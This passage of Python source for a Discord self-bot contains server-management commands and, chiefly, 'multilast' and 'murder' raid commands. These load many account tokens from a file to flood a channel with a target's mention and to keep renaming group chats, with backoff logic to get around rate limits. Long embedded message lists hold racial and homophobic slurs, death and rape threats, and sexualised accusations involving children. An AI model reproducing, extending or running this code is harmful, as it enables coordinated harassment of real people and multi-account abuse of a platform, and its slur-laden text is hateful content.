⠀⠀⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣀⣀⣴⣾⣿⡁⠀⠀⠀⡉⣉⠁⠀⠀⣠⣾⠟⠉⠉⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠉⠀⠹⣿⣶⣤⣤⣷⣿⣧⣴⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⢦⣭⡽⣯⣡⡴⠟⠁⠀⠀⠀
"""
    
    # Edit the message to say "Restarted the self-bot" and update the ASCII art
    await restart_message.edit(content=f"```ansi\n{ansi_color}{restarted_ascii}\nRestarted the self-bot.{ansi_color}\n```")
    
    try:
        # Restart the bot using the current Python interpreter and script
        os.execv(sys.executable, ["main"] + sys.argv)
    except Exception as e:
        await ctx.send(f"```Failed to restart: {e}```")
        print(f"Error while restarting the bot: {e}")

@bot.command()
@require_password()
async def reloadcog(ctx, cog_name):
    """Reload a specific cog."""
    try:
        bot.reload_extension(cog_name)
        await ctx.send(f"Reloaded cog: {cog_name}.")
    except Exception as e:
        await ctx.send(f"Failed to reload cog: {e}")   
 
 

                     
@bot.command()
@require_password()
async def copyserver(ctx ,   source_guild_id:int , target_guild_id:int):
    await ctx.message.delete()
    source_guild = bot.get_guild(source_guild_id)
    target_guild = bot.get_guild(target_guild_id)
    if not source_guild or not target_guild:
        
            
        await ctx.send("Invalid source or target server ID.")
        return
    for category in source_guild.categories:
        new_category = await target_guild.create_category(category.name)
        
        for channel in category.channels:
            if isinstance(channel, discord.TextChannel):
                await target_guild.create_text_channel(channel.name, category=new_category)
                
            elif isinstance(channel, discord.VoiceChannel):
                    await target_guild.create_voice_channel(channel.name, category=new_category)
        for channel in source_guild.text_channels:  
            if channel.category is None:
                await target_guild.create_text_channel(channel.name)
        for channel in source_guild.voice_channels:
            await target_guild.create_voice_channel(channel.name)
            
       
import platform
import psutil

@bot.command()
@require_password()
async def hostinfo(ctx):
    system = platform.system()
    release = platform.release()
    version = platform.version()
    uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())
    uptime_str = str(uptime).split('.')[0]  # Removing microseconds

    memory = psutil.virtual_memory()
    memory_total = memory.total // (1024 ** 3)
    memory_used = memory.used // (1024 ** 3)
    memory_percent = memory.percent

    cpu_usage = psutil.cpu_percent(interval=1)
    cpu_load = psutil.getloadavg() if hasattr(psutil, "getloadavg") else ("N/A", "N/A", "N/A")

    info = (
        f"THE DEMONIC SELF BOT(By voz)\n"
        f"Version : DEV\n"
        f"Prefix : {prefix}\n"
        f"**Host Information**\n"
        f"System: {system} {release} ({version})\n"
        f"Uptime: {uptime_str}\n"
        f"Memory Usage: {memory_used} GB / {memory_total} GB ({memory_percent}%)\n"
        f"CPU Usage: {cpu_usage}%\n"
        f"CPU Load: 1 min: {cpu_load[0]}, 5 min: {cpu_load[1]}, 15 min: {cpu_load[2]}"
    )

    await ctx.send(info) 
    
@bot.command()
@require_password()
async def lockserver(ctx):
    """Lock all channels in the server."""
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("Server locked.")
    
@bot.command()
@require_password()
async def banreason(ctx, user: discord.Member):
    """Display the reason a user was banned."""
    await ctx.send(f"Ban reason for {user.mention} is not implemented.")

@bot.command()
@require_password()
async def unlockserver(ctx):
    """Unlock all channels in the server."""
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("Server unlocked.") 

@bot.command()
@require_password()
async def commandsused(ctx):
    """Show how many times each command was used."""
    await ctx.send("Command usage tracking is not implemented.")
 
@bot.command()
@require_password()
async def clearemotes(ctx):
    """Remove all unused emotes from the server."""
    await ctx.send("Clearing unused emotes is not implemented.")

@bot.command()
@require_password()
async def serverboosts(ctx):
    """Display information about server boosts."""
    await ctx.send("Server boosts feature is under development.")

@bot.command()
@require_password()
async def prune(ctx, days: int):
    """Remove inactive members from the server."""
    await ctx.send(f"Pruning members inactive for {days} days is not implemented.") 
   
outlast_messages = ["NIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS U\nNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS UNIGGA UR FACING THE GODS OF FLOW discord.gg/passed RUNS U "]       
@bot.command()
@require_password()
async def multilast(ctx, user: discord.User):
    with open("tokens2.txt", "r") as f:
        tokens = f.read().splitlines()
    global outlast_running
    outlast_running = True

    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()

        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current

    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {'Authorization': token,'Content-Type': 'application/json'}

        token_counter = 1

        while outlast_running:
            message = random.choice(outlast_messages)
            global_count = await shared_counter.increment()

            payload = {'content': f"{user.mention} {message}\n```{global_count}```"}

            async with aiohttp.ClientSession() as session:
                async with session.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', 
                                      headers=headers, json=payload) as resp:
                    if resp.status == 200:
                        print(f"Message sent with token: {token}")
                        token_counter += 1
                    elif resp.status == 429:
                        print(f"Rate limited with token: {token}. Retrying...")
                        await asyncio.sleep(1)
                    else:
                        print(f"Failed to send message with token: {token}. Status code: {resp.status}")

            await asyncio.sleep(0.1)

    tasks = [send_message(token) for token in tokens]
    await asyncio.gather(*tasks)

@bot.command()
@require_password()
async def stopmultilast(ctx):
    global outlast_running
    if outlast_running:
        outlast_running = False  
        await ctx.send("The multilast command has been stopped.")
outlast_tasks = {}
murder_messages = [ "nb cares faggot", "YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck dogshit ass nigga",
"SHUT\nUP\nFAGGOT\nASS\nNIGGA\nYOU\nARE\nNOT\nON\nMY\nLEVEL\nILL\nFUCKING\nKILL\nYOU\nDIRTY\nASS\nPIG\nBASTARD\nBARREL\nNOSTRIL\nFAGGOT\nI\nOWN\nYOU\nKID\nSTFU\nLAME\nASS\nNIGGA\nU\nFUCKING\nSUCK\nI\nOWN\nBOW\nDOWN\nTO\nME\nPEASENT\nFAT\nASS\nNIGGA",
"ILL\nTAKE\nUR\nFUCKING\nSKULL\nAND\nSMASH\nIT\nU\nDIRTY\nPEDOPHILE\nGET\nUR\nHANDS\nOFF\nTHOSE\nLITTLE\nKIDS\nNASTY\nASS\nNIGGA\nILL\nFUCKNG\nKILL\nYOU\nWEIRD\nASS\nSHITTER\nDIRTFACE\nUR\nNOT\nON\nMY\nLEVEL\nCRAZY\nASS\nNIGGA\nSHUT\nTHE\nFUCK\nUP",
"NIGGAS\nTOSS\nU\nAROUND\nFOR\nFUN\nU\nFAT\nFUCK\nSTOP\nPICKING\nUR\nNOSE\nFAGGOT\nILL\nSHOOT\nUR\nFLESH\nTHEN\nFEED\nUR\nDEAD\nCORPSE\nTO\nMY\nDOGS\nU\nNASTY\nIMBECILE\nSTOP\nFUCKING\nTALKING\nIM\nABOVE\nU\nIN\nEVERY\nWAY\nLMAO\nSTFU\nFAT\nNECK\nASS\nNIGGA",
"dirty ass rodent molester",
"ILL\nBREAK\nYOUR\nFRAGILE\nLEGS\nSOFT\nFUCK\nAND\nTHEN\nSTOMP\nON\nUR\nDEAD\nCORPSE",
"weak prostitute",
"stfu dork ass nigga",
"garbage ass slut",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"]


murder_groupchat = ["nigga is a pedofile","put your nipples away?? LOL","yo pedo wakey wakey","nigga gets cucked by oyke members and likes it","nigga your a skid","fat frail loser","nigga i broke your ospec","chin up fuckface","yo this nigga slow as shit","nigga ill rip your face off","odd ball pedofile nigga"]

@bot.command()
@require_password()
async def murder(ctx, user: discord.User):
    with open("tokens2.txt", "r") as f:
     tokens = f.read().splitlines()
    
    global murder_running
    murder_running = True
    channel_id = ctx.channel.id

    class SharedCounter:
        def __init__(self):
            self.value = 1
            self.lock = asyncio.Lock()

        async def increment(self):
            async with self.lock:
                current = self.value
                self.value += 1
                return current

    shared_counter = SharedCounter()

    async def send_message(token):
        headers = {'Authorization': token,'Content-Type': 'application/json'}

        last_send_time = 0
        backoff_time = 0.1

        while murder_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_send_time

                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)

                message = random.choice(murder_messages)
                count = await shared_counter.increment()

                payload = {'content': f"{user.mention} {message}\n```{count}```"}

                async with aiohttp.ClientSession() as session:
                    async with session.post(f'https://discord.com/api/v9/channels/{ctx.channel.id}/messages', headers=headers, json=payload) as resp:
                        if resp.status == 200:
                            print(f"murder message sent with token: {token[-4:]}")
                            backoff_time = max(0.1, backoff_time * 0.95)
                            last_send_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(2.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to send message with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.1, 0.3))

            except Exception as e:
                print(f"Error in send_message for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    async def change_name(token):
        headers = {'Authorization': token, 'Content-Type': 'application/json'}

        last_change_time = 0
        backoff_time = 0.5

        while murder_running:
            try:
                current_time = time.time()
                time_since_last = current_time - last_change_time

                if time_since_last < backoff_time:
                    await asyncio.sleep(backoff_time - time_since_last)

                gc_name = random.choice(murder_groupchat)
                count = await shared_counter.increment()

                payload = {'name': f"{gc_name} {count}"}

                async with aiohttp.ClientSession() as session:
                    async with session.patch(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers, json=payload) as resp:
                        if resp.status == 200:
                            print(f"GC name changed with token: {token[-4:]}")
                            backoff_time = max(0.5, backoff_time * 0.95)
                            last_change_time = time.time()
                        elif resp.status == 429:
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"Rate limited with token: {token[-4:]}. Waiting {retry_after}s...")
                            backoff_time = min(5.0, backoff_time * 1.5)
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"Failed to change GC name with token: {token[-4:]}. Status: {resp.status}")
                            await asyncio.sleep(1)

                await asyncio.sleep(random.uniform(0.5, 1.0))

            except Exception as e:
                print(f"Error in change_name for token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)

    message_tasks = [send_message(token) for token in tokens]
    name_tasks = [change_name(token) for token in tokens]
    all_tasks = message_tasks + name_tasks
    combined_task = asyncio.gather(*all_tasks)
    murder_tasks[channel_id] = combined_task

    await ctx.send("Started murder command.")

murder_tasks = {}

@bot.command()
@require_password()
async def murderstop(ctx):
    global murder_running
    channel_id = ctx.channel.id

    if channel_id in murder_tasks:
        murder_running = False
        task = murder_tasks.pop(channel_id)
        task.cancel()
        await ctx.send("Murder command disabled.")


async def change_status():
    await bot.wait_until_ready()
    while True:
        for status in statuses:
            await bot.change_presence(activity=discord.Streaming(name=status, url="https://www.twitch.tv/ex", status=discord.Status.dnd))
            await asyncio.sleep(10) 

@bot.command()
@require_password()
async def stream(ctx, *, statuses_list: str):
    global status_changing_task
    global statuses
    
    statuses = statuses_list.split(',')
    statuses = [status.strip() for status in statuses]
    
    if status_changing_task:
        status_changing_task.cancel()
    
    status_changing_task = bot.loop.create_task(change_status())
    await ctx.send(f"```Set Status to {statuses_list}```")


status_changing_task = None

@bot.command()
@require_password()
async def streamoff(ctx):
    global status_changing_task
    
    if status_changing_task:
        status_changing_task.cancel()
        status_changing_task = None
        await bot.change_presence(activity=None)  
        await ctx.send(f'status rotation stopped')
    else:
        await ctx.send(f'status rotation is not running')



@bot.command()
@require_password()
async def dreact(ctx, user: discord.User, *emojis):
    if not emojis:
        await ctx.send("```Please provide at least one emoji```")
        return
        
    dreact_users[user.id] = [list(emojis), 0]  # [emojis_list   , and then current index cuz why not >.<]
    await ctx.send(f"```ansi\n {qqq}⛧DEMONIC X voz⛧{qqq}\n```")
    await ctx.send(f"```ansi\n {c}Started reacting to {user.name}{c}\n```")
    await ctx.send(f"```ansi\n {qqq}🪦DEMONIC X voz 🪦{qqq}```")

@bot.command()
@require_password()
async def dreactoff(ctx, user: discord.User):
    if user.id in dreact_users:
        del dreact_users[user.id]
        await ctx.send(f"```ansi\n {qqq}⛧DEMONIC X voz⛧{qqq}\n```")
        await ctx.send(f"```ansi\n {mjj}⛧Stopped all reactions.{mjj}\n```")
        await ctx.send(f"```ansi\n {qqq}🪦DEMONIC X voz 🪦{qqq}\n```")
    else: 
        await ctx.send("```This user doesn't have dreact enabled```")

import re



import ctypes

@bot.event
async def on_ready():
    
    
    print("Loading..")
    os.system('cls')
    global main
    main = f"""
    

                                        {mjj}╔════════════════════════════════════════╗
                                        {mjj}║ ╔═══╗╔═══╗╔═╗╔═╗╔═══╗╔═╗ ╔╗╔══╗╔═══╗   {mjj}║
                                        {mjj}║ ╚╗╔╗║║╔══╝║║╚╝║║║╔═╗║║║╚╗║║╚╣╠╝║╔═╗║   {mjj}║
                                        {mjj}║  ║║║║║╚══╗║╔╗╔╗║║║ ║║║╔╗╚╝║ ║║ ║║ ╚╝   {mjj}║
                                        {mjj}║  ║║║║║╔══╝║║║║║║║║ ║║║║╚╗║║ ║║ ║║ ╔╗   {mjj}║
                                        {mjj}║ ╔╝╚╝║║╚══╗║║║║║║║╚═╝║║║ ║║║╔╣╠╗║╚═╝║   {mjj}║
                                        {mjj}║ ╚═══╝╚═══╝╚╝╚╝╚╝╚═══╝╚╝ ╚═╝╚══╝╚═══╝   {mjj}║            
                                        {mjj}║           By voz                   {mjj}║
                                        {mjj}║         Dont Skid Losers               {mjj}║
                                        {mjj}╠════════════════════════════════════════╣
                                        {mjj}║ Developers: {c}voz ⛧                  {mjj}║
                                        {mjj}║ Version: {c}Dev⛧                          {mjj}║
                                        {mjj}║ Prefix : {c}{prefix}                             {mjj}║
                                        {mjj}║ Discord: {c}https://discord.gg/passed    {mjj}║
                                        {mjj}║ Welcome: {c}{bot.user}                       {mjj}║
                                        {mjj}╚════════════════════════════════════════╝
                                        
                                        
                                        
            {mjj}                            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{mjj}⠀⠀⠀    ⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⣴⣿⣿⣿⣿⡿⠁⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣷⣿⣿⣿⣿⣿⠁⠀⠀⠀⢨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡄⠀⠀⠀⠀⠋⠉⠉⠙⠛⠿⠟⠻⠿⠿⠿⠿⠷⣤⣀⠀⠀⢀⠴⠟⠛⠛⠛⠋⠉⠁⠉⠁⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢰⣄⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣧⣀⣀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣿⣿⣸⣿⣿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⢸⣿⣦⣦⣄⡀⠀⢠⣶⢰⣦⣶⣰⣆⣶⣰⣦⣄⢰⣴⡄⣴⠀⠀⣦⣷⣿⣿⣿⣿⣯⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣷⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⡿⣿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⡿⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⢹⠘⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⠹⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠟⠏⢿⢿⢿⢧⠘⣿⢿⣿⡟⠿⡇⠸⣿⠿⢻⡟⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
